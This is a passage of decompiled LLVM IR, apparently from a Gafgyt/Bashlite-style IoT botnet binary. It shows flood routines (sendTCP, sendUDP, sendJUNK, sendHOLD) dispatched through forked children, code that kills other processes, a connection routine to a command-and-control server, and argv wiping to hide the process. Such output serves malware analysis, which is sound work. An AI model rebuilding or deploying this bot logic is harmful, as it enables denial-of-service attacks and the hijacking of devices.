  store i32 268463776, i32* @lr, align 4
  %v2_10006e9c = call i32 @atol(i32 %v2_10006e94, i32 %v1_10006e90)
  br label %dec_label_pc_10006eb0

dec_label_pc_10006ea8:                            ; preds = %dec_label_pc_10006e78
  br label %dec_label_pc_10006eb0

dec_label_pc_10006eb0:                            ; preds = %dec_label_pc_10006e8c, %dec_label_pc_10006ea8
  %storemerge2 = phi i32 [ 0, %dec_label_pc_10006ea8 ], [ %v2_10006e9c, %dec_label_pc_10006e8c ]
  store i32 %v2_10006ddc, i32* @r3, align 4
  store i32 268463816, i32* @lr, align 4
  %v2_10006ec4 = call i32 @__GI_strchr(i32 %v2_10006ddc, i32 44)
  %v3_10006ecc = icmp eq i32 %v2_10006ec4, 0
  br i1 %v3_10006ecc, label %dec_label_pc_10006f64, label %dec_label_pc_10006ed4

dec_label_pc_10006ed4:                            ; preds = %dec_label_pc_10006eb0
  store i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32* @r4, align 4
  store i32 268463848, i32* @lr, align 4
  %v3_10006ee4 = call i32 @__GI_strtok(i32 %v2_10006ddc, i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32 268500992)
  %v3_10006f5819 = icmp eq i32 %v3_10006ee4, 0
  br i1 %v3_10006f5819, label %dec_label_pc_10006fac, label %dec_label_pc_10006ef4

dec_label_pc_10006ef4:                            ; preds = %dec_label_pc_10006ed4, %dec_label_pc_10006f3c
  %storemerge1020 = phi i32 [ %v3_10006f48, %dec_label_pc_10006f3c ], [ %v3_10006ee4, %dec_label_pc_10006ed4 ]
  store i32 268463864, i32* @lr, align 4
  %v0_10006ef4 = call i32 @listFork()
  %v3_10006efc = icmp eq i32 %v0_10006ef4, 0
  br i1 %v3_10006efc, label %dec_label_pc_10006f04, label %dec_label_pc_10006f3c

dec_label_pc_10006f04:                            ; preds = %dec_label_pc_10006ef4
  %v7_10006f20 = call i32 @sendTCP(i32 %storemerge1020, i32 %v2_10006df4, i32 %v2_10006e10, i32 %v2_10006e2c, i32 %v2_10006e40, i32 %storemerge2, i32 %storemerge3)
  %v3_10006f28 = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006f34.117 to i32), i32* @lr, align 4
  %v1_10006f30 = call i32 @__libc_close(i32 %v3_10006f28)
  %v1_10006f38 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006f3c

dec_label_pc_10006f3c:                            ; preds = %dec_label_pc_10006ef4, %dec_label_pc_10006f04
  store i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32* @r4, align 4
  store i32 268463948, i32* @lr, align 4
  %v3_10006f48 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32 268500992)
  %v3_10006f58 = icmp eq i32 %v3_10006f48, 0
  br i1 %v3_10006f58, label %dec_label_pc_10006fac, label %dec_label_pc_10006ef4

dec_label_pc_10006f64:                            ; preds = %dec_label_pc_10006eb0
  store i32 268463976, i32* @lr, align 4
  %v0_10006f64 = call i32 @listFork()
  %v3_10006f6c = icmp eq i32 %v0_10006f64, 0
  br i1 %v3_10006f6c, label %dec_label_pc_10006f74, label %dec_label_pc_10007108

dec_label_pc_10006f74:                            ; preds = %dec_label_pc_10006f64
  %v7_10006f90 = call i32 @sendTCP(i32 %v2_10006ddc, i32 %v2_10006df4, i32 %v2_10006e10, i32 %v2_10006e2c, i32 %v2_10006e40, i32 %storemerge2, i32 %storemerge3)
  %v3_10006f98 = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006fa4.119 to i32), i32* @lr, align 4
  %v1_10006fa0 = call i32 @__libc_close(i32 %v3_10006f98)
  %v1_10006fa8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006fac

dec_label_pc_10006fac:                            ; preds = %dec_label_pc_10006f3c, %dec_label_pc_10006ed4, %dec_label_pc_10006cbc, %dec_label_pc_10006f74
  %v2_10006fb0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000e348.120 to i32), i32* @r4, align 4
  %v4_10006fc0 = inttoptr i32 %v2_10006fb0 to i8*
  %v5_10006fc0 = call i32 @__GI_strcoll(i8* %v4_10006fc0, i32 ptrtoint ([9 x i8]* @global_var_1000e348.120 to i32), i32 268500992)
  %v3_10006fc8 = icmp eq i32 %v5_10006fc0, 0
  br i1 %v3_10006fc8, label %dec_label_pc_10006fd0, label %dec_label_pc_100070dc

dec_label_pc_10006fd0:                            ; preds = %dec_label_pc_10006fac
  br label %dec_label_pc_10007074

dec_label_pc_10006fe4:                            ; preds = %dec_label_pc_10007074, %dec_label_pc_100070bc
  %v1_10006fe8 = mul i32 %storemerge8, 4
  %v3_10006ff4 = load i32, i32* @global_var_1001fdc0.44, align 4
  %v2_10006ff8 = add i32 %v3_10006ff4, %v1_10006fe8
  %v1_10006ffc = inttoptr i32 %v2_10006ff8 to i32*
  %v2_10006ffc = load i32, i32* %v1_10006ffc, align 4
  %v3_10007000 = icmp eq i32 %v2_10006ffc, 0
  br i1 %v3_10007000, label %dec_label_pc_10007068, label %dec_label_pc_10007008

dec_label_pc_10007008:                            ; preds = %dec_label_pc_10006fe4
  %v2_10007020 = load i32, i32* %v1_10006ffc, align 4
  store i32 268464168, i32* @lr, align 4
  %v0_10007024 = call i32 @__libc_getpid()
  %v4_1000702c = icmp eq i32 %v2_10007020, %v0_10007024
  br i1 %v4_1000702c, label %dec_label_pc_10007068, label %dec_label_pc_10007034

dec_label_pc_10007034:                            ; preds = %dec_label_pc_10007008
  %v3_10007044 = load i32, i32* @global_var_1001fdc0.44, align 4
  %v2_10007048 = add i32 %v3_10007044, %v1_10006fe8
  %v1_1000704c = inttoptr i32 %v2_10007048 to i32*
  %v2_1000704c = load i32, i32* %v1_1000704c, align 4
  store i32 268464220, i32* @lr, align 4
  %v2_10007058 = call i32 @kill(i32 %v2_1000704c, i32 9)
  %v1_10007060 = add i32 %stack_var_-180.1, 1
  br label %dec_label_pc_10007068

dec_label_pc_10007068:                            ; preds = %dec_label_pc_10007008, %dec_label_pc_10006fe4, %dec_label_pc_10007034
  %stack_var_-180.0 = phi i32 [ %stack_var_-180.1, %dec_label_pc_10006fe4 ], [ %stack_var_-180.1, %dec_label_pc_10007008 ], [ %v1_10007060, %dec_label_pc_10007034 ]
  %v1_1000706c = add i32 %storemerge8, 1
  br label %dec_label_pc_10007074

dec_label_pc_10007074:                            ; preds = %dec_label_pc_10006fd0, %dec_label_pc_10007068
  %stack_var_-180.1 = phi i32 [ 0, %dec_label_pc_10006fd0 ], [ %stack_var_-180.0, %dec_label_pc_10007068 ]
  %storemerge8 = phi i32 [ 0, %dec_label_pc_10006fd0 ], [ %v1_1000706c, %dec_label_pc_10007068 ]
  %v2_1000709c = load i32, i32* @global_var_1001fda0.42, align 4
  %v3_100070b4 = icmp eq i32 %v2_1000709c, 0
  br i1 %v3_100070b4, label %dec_label_pc_100070bc, label %dec_label_pc_10006fe4

dec_label_pc_100070bc:                            ; preds = %dec_label_pc_10007074
  %v3_100070a0 = load i32, i32* @global_var_1001fda4.43, align 4
  %v3_100070d4 = icmp ugt i32 %v3_100070a0, %storemerge8
  br i1 %v3_100070d4, label %dec_label_pc_10006fe4, label %dec_label_pc_100070dc

dec_label_pc_100070dc:                            ; preds = %dec_label_pc_100070bc, %dec_label_pc_10006fac
  %v2_100070e0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1000e354.121 to i32), i32* @r4, align 4
  %v4_100070f0 = inttoptr i32 %v2_100070e0 to i8*
  %v5_100070f0 = call i32 @__GI_strcoll(i8* %v4_100070f0, i32 ptrtoint ([10 x i8]* @global_var_1000e354.121 to i32), i32 268500992)
  %v3_100070f8 = icmp eq i32 %v5_100070f0, 0
  br i1 %v3_100070f8, label %dec_label_pc_10007100, label %dec_label_pc_10007108

dec_label_pc_10007100:                            ; preds = %dec_label_pc_100070dc
  %v0_10007104 = call i32 @__GI_exit()
  br label %dec_label_pc_10007108

dec_label_pc_10007108:                            ; preds = %dec_label_pc_10006db0, %dec_label_pc_10006af4, %dec_label_pc_100068a0, %dec_label_pc_10006710, %dec_label_pc_10006818, %dec_label_pc_100069a8, %dec_label_pc_10006c78, %dec_label_pc_10006f64, %dec_label_pc_100070dc, %dec_label_pc_10006d84, %dec_label_pc_10006d58, %dec_label_pc_10006d34, %dec_label_pc_10006d10, %dec_label_pc_10006cec, %dec_label_pc_10006ce0, %dec_label_pc_10006ac8, %dec_label_pc_10006aa0, %dec_label_pc_10006a7c, %dec_label_pc_10006a58, %dec_label_pc_10006a34, %dec_label_pc_10006a10, %dec_label_pc_10006a04, %dec_label_pc_10006880, %dec_label_pc_10006874, %dec_label_pc_100066f0, %dec_label_pc_100066e4, %dec_label_pc_10006680, %dec_label_pc_1000663c, %dec_label_pc_10007100
  %v0_10007120 = phi i32 [ %v2_10006dc0, %dec_label_pc_10006db0 ], [ %v2_10006b04, %dec_label_pc_10006af4 ], [ %v2_100068b0, %dec_label_pc_100068a0 ], [ %v2_10006720, %dec_label_pc_10006710 ], [ %v0_10006818, %dec_label_pc_10006818 ], [ %v0_100069a8, %dec_label_pc_100069a8 ], [ %v0_10006c78, %dec_label_pc_10006c78 ], [ %v0_10006f64, %dec_label_pc_10006f64 ], [ %v5_100070f0, %dec_label_pc_100070dc ], [ %v2_10006d94, %dec_label_pc_10006d84 ], [ %v2_10006d68, %dec_label_pc_10006d58 ], [ -1, %dec_label_pc_10006d34 ], [ -1, %dec_label_pc_10006d10 ], [ -1, %dec_label_pc_10006cec ], [ 0, %dec_label_pc_10006ce0 ], [ %v2_10006ad8, %dec_label_pc_10006ac8 ], [ %v2_10006ab0, %dec_label_pc_10006aa0 ], [ -1, %dec_label_pc_10006a7c ], [ -1, %dec_label_pc_10006a58 ], [ -1, %dec_label_pc_10006a34 ], [ -1, %dec_label_pc_10006a10 ], [ 0, %dec_label_pc_10006a04 ], [ %v2_10006890, %dec_label_pc_10006880 ], [ 0, %dec_label_pc_10006874 ], [ %v2_10006700, %dec_label_pc_100066f0 ], [ 0, %dec_label_pc_100066e4 ], [ %v5_100066b8, %dec_label_pc_10006680 ], [ %v4_10006654, %dec_label_pc_1000663c ], [ %v0_10007104, %dec_label_pc_10007100 ]
  ret i32 %v0_10007120

; uselistorder directives
  uselistorder i32 %storemerge8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-180.1, { 0, 2, 1 }
  uselistorder i32 %v1_10006fe8, { 1, 0 }
  uselistorder i32 %v3_10006f48, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v2_10006e40, { 1, 0 }
  uselistorder i32 %v2_10006e2c, { 1, 0 }
  uselistorder i32 %v2_10006e10, { 1, 0 }
  uselistorder i32 %v2_10006df4, { 1, 0 }
  uselistorder i32 %v2_10006ddc, { 1, 0, 3, 2 }
  uselistorder i32 %v3_10006c5c, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v2_10006b8c, { 1, 0 }
  uselistorder i32 %v2_10006b70, { 1, 0 }
  uselistorder i32 %v2_10006b54, { 1, 0 }
  uselistorder i32 %v2_10006b38, { 1, 0 }
  uselistorder i32 %v2_10006b20, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000698c, { 1, 0 }
  uselistorder i32 %v2_10006900, { 1, 0 }
  uselistorder i32 %v2_100068e4, { 1, 0 }
  uselistorder i32 %v2_100068cc, { 1, 0, 3, 2 }
  uselistorder i32 %v3_100067fc, { 1, 0 }
  uselistorder i32 %v2_10006770, { 1, 0 }
  uselistorder i32 %v2_10006754, { 1, 0 }
  uselistorder i32 %v2_1000673c, { 1, 0, 3, 2 }
  uselistorder i32 %tmp, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendJUNK, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), { 3, 10, 4, 11, 2, 12, 5, 13, 1, 14, 6, 15, 0, 16, 7, 17, 8, 18, 9, 19 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1000e27c.38 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_10007108, { 28, 8, 7, 0, 9, 10, 11, 12, 13, 14, 6, 1, 15, 16, 17, 18, 19, 20, 21, 5, 2, 22, 23, 4, 3, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_10007074, { 1, 0 }
  uselistorder label %dec_label_pc_10007068, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006fe4, { 1, 0 }
  uselistorder label %dec_label_pc_10006fac, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10006f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10006ef4, { 1, 0 }
  uselistorder label %dec_label_pc_10006eb0, { 1, 0 }
  uselistorder label %dec_label_pc_10006e78, { 1, 0 }
  uselistorder label %dec_label_pc_10006dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10006cbc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10006c50, { 1, 0 }
  uselistorder label %dec_label_pc_10006c0c, { 1, 0 }
  uselistorder label %dec_label_pc_10006bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10006b18, { 1, 0 }
  uselistorder label %dec_label_pc_100069e0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10006980, { 1, 0 }
  uselistorder label %dec_label_pc_10006948, { 1, 0 }
  uselistorder label %dec_label_pc_10006850, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100067f0, { 1, 0 }
  uselistorder label %dec_label_pc_100067b8, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-548 = alloca i32, align 4
  %v2_10007138 = ptrtoint i32* %stack_var_-548 to i32
  store i32 268464464, i32* @lr, align 4
  %v3_1000714c = call i32 @__GI_memset(i32 %v2_10007138, i32 0, i32 512)
  %v3_10007154 = load i32, i32* @global_var_1001fd98.37, align 4
  %v3_10007158 = icmp eq i32 %v3_10007154, 0
  br i1 %v3_10007158, label %dec_label_pc_1000717c, label %dec_label_pc_10007160

dec_label_pc_10007160:                            ; preds = %entry
  store i32 268464496, i32* @lr, align 4
  %v1_1000716c = call i32 @__libc_close(i32 %v3_10007154)
  store i32 0, i32* @global_var_1001fd98.37, align 4
  br label %dec_label_pc_1000717c

dec_label_pc_1000717c:                            ; preds = %entry, %dec_label_pc_10007160
  %v3_10007180 = load i32, i32* @global_var_1001fd50.122, align 4
  %v3_10007184 = icmp eq i32 %v3_10007180, 0
  br i1 %v3_10007184, label %dec_label_pc_1000718c, label %dec_label_pc_1000719c

dec_label_pc_1000718c:                            ; preds = %dec_label_pc_1000717c
  br label %dec_label_pc_100071b0

dec_label_pc_1000719c:                            ; preds = %dec_label_pc_1000717c
  %v1_100071a4 = add i32 %v3_10007180, 1
  br label %dec_label_pc_100071b0

dec_label_pc_100071b0:                            ; preds = %dec_label_pc_1000718c, %dec_label_pc_1000719c
  %storemerge = phi i32 [ 0, %dec_label_pc_1000718c ], [ %v1_100071a4, %dec_label_pc_1000719c ]
  store i32 %storemerge, i32* @global_var_1001fd50.122, align 4
  %v1_100071c4 = mul i32 %storemerge, 4
  %v2_100071c8 = add i32 %v1_100071c4, ptrtoint ([19 x i8]** @global_var_1001fd4c.124 to i32)
  %v1_100071cc = inttoptr i32 %v2_100071c8 to i32*
  %v2_100071cc = load i32, i32* %v1_100071cc, align 4
  %v2_100071d8 = inttoptr i32 %v2_100071cc to i8*
  %v3_100071d8 = call i32 @strcpy(i32 %v2_10007138, i8* %v2_100071d8)
  store i32 %v2_10007138, i32* @r3, align 4
  store i32 268464628, i32* @lr, align 4
  %v2_100071f0 = call i32 @__GI_strchr(i32 %v2_10007138, i32 58)
  %v3_100071f8 = icmp eq i32 %v2_100071f0, 0
  br i1 %v3_100071f8, label %dec_label_pc_10007248, label %dec_label_pc_10007200

dec_label_pc_10007200:                            ; preds = %dec_label_pc_100071b0
  store i32 %v2_10007138, i32* @r3, align 4
  store i32 268464656, i32* @lr, align 4
  %v2_1000720c = call i32 @__GI_strchr(i32 %v2_10007138, i32 58)
  %v1_10007214 = add i32 %v2_1000720c, 1
  store i32 268464672, i32* @lr, align 4
  %v2_1000721c = call i32 @atol(i32 %v1_10007214, i32 %v2_1000720c)
  store i32 %v2_10007138, i32* @r3, align 4
  store i32 268464696, i32* @lr, align 4
  %v2_10007234 = call i32 @__GI_strchr(i32 %v2_10007138, i32 58)
  %v3_10007244 = inttoptr i32 %v2_10007234 to i8*
  store i8 0, i8* %v3_10007244, align 1
  br label %dec_label_pc_10007248

dec_label_pc_10007248:                            ; preds = %dec_label_pc_100071b0, %dec_label_pc_10007200
  %stack_var_-552.0 = phi i32 [ 777, %dec_label_pc_100071b0 ], [ %v2_1000721c, %dec_label_pc_10007200 ]
  store i32 268464728, i32* @lr, align 4
  %v3_10007254 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_10007254, i32* @global_var_1001fd98.37, align 4
  store i32 268464772, i32* @lr, align 4
  %v5_10007280 = call i32 @connectTimeout(i32 %v3_10007254, i32 %v2_10007138, i32 %stack_var_-552.0, i32 30, i32 %v2_10007138)
  %v3_10007288 = icmp eq i32 %v5_10007280, 0
  %. = zext i1 %v3_10007288 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_10007138, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 (i32, i32)* @atol, { 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10007248, { 1, 0 }
  uselistorder label %dec_label_pc_100071b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000717c, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4160 = alloca i8, align 1
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-4196 = alloca i32, align 4
  store i32 268464872, i32* @lr, align 4
  %v3_100072e4 = call i32 @socket(i32 2, i32 2, i32 0)
  %v4_100072f8 = icmp eq i32 %v3_100072e4, -1
  br i1 %v4_100072f8, label %dec_label_pc_10007300, label %dec_label_pc_1000730c

dec_label_pc_10007300:                            ; preds = %entry
  br label %dec_label_pc_10007538

dec_label_pc_1000730c:                            ; preds = %entry
  %v2_1000730c = ptrtoint i32* %stack_var_-4196 to i32
  store i32 2, i32* %stack_var_-4196, align 4
  store i32 268464964, i32* @lr, align 4
  %v2_10007340 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_1000e360.126 to i32))
  store i32 53, i32* @r3, align 4
  %v1_10007350 = call i32 @htons(i32 53)
  store i32 268465008, i32* @lr, align 4
  %v3_1000736c = call i32 @__libc_connect(i32 %v3_100072e4, i32 %v2_1000730c, i32 16)
  %v4_10007380 = icmp eq i32 %v3_1000736c, -1
  br i1 %v4_10007380, label %dec_label_pc_10007388, label %dec_label_pc_10007394

dec_label_pc_10007388:                            ; preds = %dec_label_pc_1000730c
  br label %dec_label_pc_10007538

dec_label_pc_10007394:                            ; preds = %dec_label_pc_1000730c
  store i32 16, i32* %stack_var_-4164, align 4
  %v2_1000739c = ptrtoint i32* %stack_var_-4180 to i32
  %v2_100073a0 = ptrtoint i32* %stack_var_-4164 to i32
  store i32 268465076, i32* @lr, align 4
  %v4_100073b0 = call i32 @__GI_getsockname(i32 %v3_100072e4, i32 %v2_1000739c, i32 %v2_100073a0, i32 %v2_100073a0)
  %v4_100073c4 = icmp eq i32 %v4_100073b0, -1
  br i1 %v4_100073c4, label %dec_label_pc_100073cc, label %dec_label_pc_100073d8

dec_label_pc_100073cc:                            ; preds = %dec_label_pc_10007394
  br label %dec_label_pc_10007538

dec_label_pc_100073d8:                            ; preds = %dec_label_pc_10007394
  store i32 268465144, i32* @lr, align 4
  %v3_100073f4 = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_1000e368.127 to i32), i32 0)
  %v2_10007478 = ptrtoint i8* %stack_var_-4160 to i32
  br label %dec_label_pc_10007478

dec_label_pc_10007404:                            ; preds = %dec_label_pc_10007478
  store i32 268465176, i32* @lr, align 4
  %v5_10007414 = call i32 @strstr(i32 %v2_10007478, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000e378.128, i32 0, i32 0), i32 268500992)
  %v3_1000741c = icmp eq i32 %v5_10007414, 0
  br i1 %v3_1000741c, label %dec_label_pc_10007460, label %dec_label_pc_1000743c.preheader

dec_label_pc_1000743c.preheader:                  ; preds = %dec_label_pc_10007404
  %v2_1000744010 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000744814 = icmp eq i8 %v2_1000744010, 9
  br i1 %v3_1000744814, label %dec_label_pc_10007450, label %dec_label_pc_10007430

dec_label_pc_10007430:                            ; preds = %dec_label_pc_1000743c.preheader, %dec_label_pc_10007430
  %v4_1000743c15 = phi i32 [ %v1_10007434, %dec_label_pc_10007430 ], [ %v2_10007478, %dec_label_pc_1000743c.preheader ]
  %v1_10007434 = add i32 %v4_1000743c15, 1
  %v5_10007438 = inttoptr i32 %v1_10007434 to i8*
  %v2_10007440 = load i8, i8* %v5_10007438, align 1
  %v3_10007448 = icmp eq i8 %v2_10007440, 9
  br i1 %v3_10007448, label %dec_label_pc_10007450, label %dec_label_pc_10007430

dec_label_pc_10007450:                            ; preds = %dec_label_pc_10007430, %dec_label_pc_1000743c.preheader
  %storemerge4.lcssa = phi i8* [ %stack_var_-4160, %dec_label_pc_1000743c.preheader ], [ %v5_10007438, %dec_label_pc_10007430 ]
  store i8 0, i8* %storemerge4.lcssa, align 1
  br label %dec_label_pc_10007498

dec_label_pc_10007460:                            ; preds = %dec_label_pc_10007404
  store i32 268465272, i32* @lr, align 4
  %v3_10007474 = call i32 @__GI_memset(i32 %v2_10007478, i32 0, i32 4096)
  br label %dec_label_pc_10007478

dec_label_pc_10007478:                            ; preds = %dec_label_pc_100073d8, %dec_label_pc_10007460
  %v3_10007488 = call i32 @fdgets(i32 %v2_10007478, i32 4096, i32 %v3_100073f4)
  %v3_10007490 = icmp eq i32 %v3_10007488, 0
  br i1 %v3_10007490, label %dec_label_pc_10007498, label %dec_label_pc_10007404

dec_label_pc_10007498:                            ; preds = %dec_label_pc_10007478, %dec_label_pc_10007450
  store i32 268465312, i32* @lr, align 4
  %v1_1000749c = call i32 @__libc_close(i32 %v3_100073f4)
  %v3_100074a0 = load i8, i8* %stack_var_-4160, align 1
  %v3_100074a8 = icmp eq i8 %v3_100074a0, 0
  br i1 %v3_100074a8, label %dec_label_pc_1000752c, label %dec_label_pc_100074b0

dec_label_pc_100074b0:                            ; preds = %dec_label_pc_10007498
  %v2_100074b0 = ptrtoint i32* %stack_var_-64 to i32
  %v3_100074c0 = call i32 @strcpy(i32 %v2_100074b0, i8* nonnull %stack_var_-4160)
  store i32 ptrtoint (i32* @global_var_100074e0.129 to i32), i32* @lr, align 4
  %v3_100074dc = call i32 @ioctl(i32 %v3_100072e4, i32 35111, i32 %v2_100074b0)
  %v2_100074f4 = ptrtoint i32* %stack_var_-46 to i32
  br label %dec_label_pc_100074ec

dec_label_pc_100074ec:                            ; preds = %dec_label_pc_100074b0, %dec_label_pc_100074ec
  %storemerge58 = phi i32 [ 0, %dec_label_pc_100074b0 ], [ %v1_10007518, %dec_label_pc_100074ec ]
  %v2_100074fc = add i32 %storemerge58, %v2_100074f4
  %v1_10007500 = inttoptr i32 %v2_100074fc to i8*
  %v2_10007500 = load i8, i8* %v1_10007500, align 1
  %v4_10007510 = add i32 %storemerge58, ptrtoint (i32* @global_var_1001fda8.130 to i32)
  %v5_10007510 = inttoptr i32 %v4_10007510 to i8*
  store i8 %v2_10007500, i8* %v5_10007510, align 1
  %v1_10007518 = add nuw nsw i32 %storemerge58, 1
  %tmp37 = icmp slt i32 %v1_10007518, 6
  br i1 %tmp37, label %dec_label_pc_100074ec, label %dec_label_pc_1000752c

dec_label_pc_1000752c:                            ; preds = %dec_label_pc_100074ec, %dec_label_pc_10007498
  store i32 ptrtoint (i32* @global_var_10007534.131 to i32), i32* @lr, align 4
  %v1_10007530 = call i32 @__libc_close(i32 %v3_100072e4)
  br label %dec_label_pc_10007540

dec_label_pc_10007538:                            ; preds = %dec_label_pc_100073cc, %dec_label_pc_10007388, %dec_label_pc_10007300
  br label %dec_label_pc_10007540

dec_label_pc_10007540:                            ; preds = %dec_label_pc_1000752c, %dec_label_pc_10007538
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_10007538 ], [ %tmp, %dec_label_pc_1000752c ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %storemerge58, { 2, 1, 0 }
  uselistorder i32 %v1_10007434, { 1, 0 }
  uselistorder i32 %v2_10007478, { 3, 1, 0, 2 }
  uselistorder i32 %v3_100072e4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
  uselistorder i8* %stack_var_-4160, { 2, 4, 0, 1, 3 }
  uselistorder i32 (i32)* @__libc_close, { 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 2, 1, 0, 8, 7, 6, 5, 4, 3 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @htons, { 12, 11, 10, 9, 0, 7, 6, 5, 4, 8, 3, 2, 1 }
  uselistorder i32 (i32)* @inet_addr, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 7, 6, 5, 4, 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10007540, { 1, 0 }
  uselistorder label %dec_label_pc_100074ec, { 1, 0 }
  uselistorder label %dec_label_pc_10007478, { 1, 0 }
  uselistorder label %dec_label_pc_10007430, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-5212 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-5320 = alloca i32, align 4
  %stack_var_-5256 = alloca i32, align 4
  store i32 268465548, i32* @lr, align 4
  %v1_10007588 = call i32 @__GI_time(i32 0)
  store i32 268465556, i32* @lr, align 4
  %v0_10007590 = call i32 @__libc_getpid()
  %v2_10007598 = xor i32 %v1_10007588, %v0_10007590
  store i32 ptrtoint ([3 x i8]* @global_var_100075a4.132 to i32), i32* @lr, align 4
  %v1_100075a0 = call i32 @srand(i32 %v2_10007598)
  store i32 268465580, i32* @lr, align 4
  %v1_100075a8 = call i32 @__GI_time(i32 0)
  store i32 268465588, i32* @lr, align 4
  %v0_100075b0 = call i32 @__libc_getpid()
  %v2_100075b8 = xor i32 %v1_100075a8, %v0_100075b0
  %v1_100075c0 = call i32 @init_rand(i32 %v2_100075b8)
  store i32 268465608, i32* @lr, align 4
  %v1_100075c4 = call i32 @getOurIP(i32 %v1_100075c0)
  %v1_100075cc = bitcast i8** %argv to i32*
  %v2_100075cc = load i32, i32* %v1_100075cc, align 4
  store i32 %v2_100075cc, i32* @r3, align 4
  %v0_100075e0 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_1000e384.133 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_100075fc.134 to i32), i32* @lr, align 4
  %v5_100075f8 = call i32 @strncpy(i32 %v2_100075cc, i32 ptrtoint ([6 x i8]* @global_var_1000e384.133 to i32), i32 %v0_100075e0, i32 268500992)
  %v2_1000766c50 = icmp sgt i32 %argc, 1
  br i1 %v2_1000766c50, label %dec_label_pc_10007608, label %dec_label_pc_10007674

dec_label_pc_10007608:                            ; preds = %entry, %dec_label_pc_10007608
  %storemerge1253 = phi i32 [ %v1_1000765c, %dec_label_pc_10007608 ], [ 1, %entry ]
  %v1_1000760c = mul i32 %storemerge1253, 4
  %v2_10007618 = add i32 %v1_1000760c, %tmp
  %v1_1000761c = inttoptr i32 %v2_10007618 to i32*
  %v2_1000761c = load i32, i32* %v1_1000761c, align 4
  store i32 %v2_1000761c, i32* @r3, align 4
  %v0_1000763c = call i32 @__GI_strlen()
  store i32 268465752, i32* @lr, align 4
  %v3_10007654 = call i32 @__GI_memset(i32 %v2_1000761c, i32 0, i32 %v0_1000763c)
  %v1_1000765c = add nuw nsw i32 %storemerge1253, 1
  %v2_1000766c = icmp slt i32 %v1_1000765c, %argc
  br i1 %v2_1000766c, label %dec_label_pc_10007608, label %dec_label_pc_10007674

dec_label_pc_10007674:                            ; preds = %dec_label_pc_10007608, %entry
  %v1_10007674 = call i32 @getBuild(i32 %argc)
  %v0_1000767c = call i32 @getEndianness()
  store i32 268465800, i32* @lr, align 4
